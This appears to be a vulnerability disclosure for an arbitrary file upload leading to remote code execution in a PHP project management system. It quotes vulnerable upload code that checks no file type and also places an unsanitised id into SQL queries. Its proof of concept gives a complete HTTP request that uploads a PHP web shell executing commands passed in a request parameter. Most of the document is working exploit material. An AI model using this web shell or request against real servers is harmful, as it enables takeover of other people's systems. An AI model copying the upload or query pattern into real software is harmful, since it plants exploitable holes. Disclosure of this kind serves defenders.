# Remote Code Execution via Arbitrary File Upload in Project Management System

## Vendor Homepage:
> https://www.campcodes.com/projects/php/project-management-system-using-php-mysql-free-download/


## Code
``` php

if($action == 'change_pic'){
	$id = $_GET['id'];
			$rd2 = mt_rand(1000, 9999);
			$filename = basename($_FILES['file']['name']);
			$ext = substr($filename, strrpos($filename, '.') + 1);
			$file = $rd2. "_" .$filename;
			(move_uploaded_file($_FILES['file']['tmp_name'],'../images/'.$file));

	$query = mysqli_query($conn,"UPDATE employee set e_pic = '$file' where eid = '$id'");
	if($query){
		echo '<script> location.replace(document.referrer);</script>';
	}
}if($action == 'change_pic2'){
	$id = $_GET['id'];
			$rd2 = mt_rand(1000, 9999);
			$filename = basename($_FILES['file']['name']);
			$ext = substr($filename, strrpos($filename, '.') + 1);
			$file = $rd2. "_" .$filename;
			(move_uploaded_file($_FILES['file']['tmp_name'],'../images/'.$file));

	$query = mysqli_query($conn,"UPDATE projects set site_pic = '$file' where project_id = '$id'");
	if($query){
		echo '<script> location.replace(document.referrer);</script>';
	}
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /construction_pms/forms/update_forms.php?action=change_pic2&id=4 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------38905024417471001122094028099
Content-Length: 352
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/construction_pms/pages/index.php?page=project_detail&id=4&action=view%20details
Cookie: csrftoken=hn6Cf393SZVS43NE14nv2rYENzlA2dLXNthZqmVXNw6j1t0dOvrk3n8kgQeKAnBn; PHPSESSID=4jmkopecfop3ncakolevod8ugd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------38905024417471001122094028099

Content-Disposition: form-data; name="file"; filename="test1.php"
Content-Type: application/x-php

<?php echo isset($_REQUEST['x']) ? "<pre>" . shell_exec(escapeshellcmd($_REQUEST['x'])) . "</pre>" : "No input provided."; ?>

-----------------------------38905024417471001122094028099--
```

## Screenshot
![image](https://github.com/user-attachments/assets/dff708b1-405e-4516-9b6f-4c658adca694)


## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
